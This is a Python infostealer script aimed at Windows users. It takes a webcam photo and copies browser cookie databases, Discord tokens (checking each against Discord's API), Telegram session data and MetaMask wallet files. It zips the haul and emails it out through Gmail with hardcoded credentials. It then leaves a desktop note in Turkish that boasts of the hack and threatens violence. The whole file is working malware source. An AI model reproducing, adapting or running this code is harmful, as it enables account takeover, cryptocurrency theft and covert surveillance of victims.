import os, platform,shutil,requests
import pygame
import pygame.camera
from re import findall
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
import subprocess

home_path=os.path.expanduser("~")
pc_name=platform.uname()[1]
save_path=home_path+r"\\"+pc_name
os.mkdir(save_path)

def take_img():
    global home_path
    global pc_name
    global save_path

    pygame.camera.init() 
    cam_list=pygame.camera.list_cameras()
    if cam_list:
        cam = pygame.camera.Camera(cam_list[0]) 
        cam.start() 
        img = cam.get_image() 
        import pygame.image 
        pygame.image.save(img, save_path+r"\\photo.jpg") 
        pygame.camera.quit() 
    else:
        open(save_path+r"\\camer_status.txt","w").write("no camera found")


def browser():
    global home_path
    global pc_name
    global save_path

    brave_path=home_path+r"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
    chrome_path=home_path+r"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    edge_path=home_path+r"\\AppData\\Local\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
    opera_path=home_path+r"\\AppData\\Local\\Opera Software\\Opera Stable\\Network\\Cookies"
    if os.path.exists(brave_path):
        shutil.copy(brave_path,save_path+r"\\brave_cookie")
    if os.path.exists(chrome_path):
        shutil.copy(chrome_path,save_path+r"\\chrome_cookie")
    if os.path.exists(edge_path):
        shutil.copy(edge_path,save_path+r"\\edge_cookie")
    if os.path.exists(opera_path):
        shutil.copy(opera_path,save_path+r"\\opera_cookie")


def chatting_app():
    global home_path
    global pc_name
    global save_path

    d_headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Authorization":None
    }
    discord_path=home_path+r"\\AppData\\Roaming\\discord\\Local Storage\\leveldb"
    telegram_path=home_path+r"\\AppData\\Roaming\\Telegram Desktop\\tdata"
    tokens = []
    try:
        if os.path.exists(discord_path):
            for file_name in os.listdir(discord_path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{discord_path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            for token in tokens:
                d_headers["Authorization"]=token
                r=requests.get("https://discordapp.com/api/v9/users/@me", headers=d_headers).text
                open(save_path+r"\\discord.txt","a").write("token="+token)
                open(save_path+r"\\discord.txt","a").write(r)
        if os.path.exists(telegram_path):
            subprocess.run(["xcopy",telegram_path, save_path+r"\\Telegram\\tdata","/E", "/I", "/Y"])
            subprocess.run(["xcopy",telegram_path+r"\\user_data", save_path+r"\\Telegram\\tdata\\user_data","/E", "/I", "/Y"])

    except PermissionError:
        return 0


def wallet():
    global home_path
    global pc_name
    global save_path

    brave_metamask=home_path+r"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    chrome_metamask=home_path+r"\\AppData\\Local\\Google\\Chrome\\User Data\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    edge_metamask=home_path+r"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    opera_metamask=home_path+r"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    try:
        if os.path.exists(brave_metamask):
            subprocess.run(["xcopy",brave_metamask, save_path+r"\\brave_metamask","/E", "/I", "/Y"])
        if os.path.exists(chrome_metamask):
            subprocess.run(["xcopy",chrome_metamask, save_path+r"\\chrome_metamask","/E", "/I", "/Y"])
        if os.path.exists(edge_metamask):
            subprocess.run(["xcopy",edge_metamask, save_path+r"\\edge_metamask","/E", "/I", "/Y"])
        if os.path.exists(opera_metamask):
            subprocess.run(["xcopy",opera_metamask, save_path+r"\\opera_metamask","/E", "/I", "/Y"])
    except PermissionError:
        return 0
def send_mail(attachment_path):
    smtp_server = "smtp.gmail.com"  # veya başka bir e-posta sağlayıcısı
    port = 587  # 587 TLS için kullanılan yaygın bir porttur
    server = smtplib.SMTP(smtp_server, port)
    server.starttls()
    server.login("clarke.easten@gmail.com","fyeglwptuuqbjitp")
    message = MIMEMultipart()
    message["From"] ="clarke.easten@gmail.com"
    message["To"] = "clarke.easten@gmail.com"
    message["Subject"] = "veri kaçırma"

    message.attach(MIMEText("buyur kardeş","plain"))
    with open(attachment_path, "rb") as file:
        part = MIMEBase("application", "zip")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(attachment_path)}")
        message.attach(part)

    server.sendmail("clarke.easten@gmail.com","clarke.easten@gmail.com", message.as_string())
    server.quit()
def start_4ttaCk():
    global home_path
    global pc_name
    global save_path

    take_img()
    browser()
    chatting_app()
    wallet()
    shutil.make_archive(home_path+r"\\"+pc_name,"zip",save_path)
    send_mail(save_path+".zip")
    open(home_path+r"\\Desktop\\hacked.txt","w").write("ben 3YC. tarafımca hacklendiniz ve bilgileriniz çalındı. bu adı unutmatyın daha çok görüceksiniz.Türk'e başkaldıranın başını kesicez.")

start_4ttaCk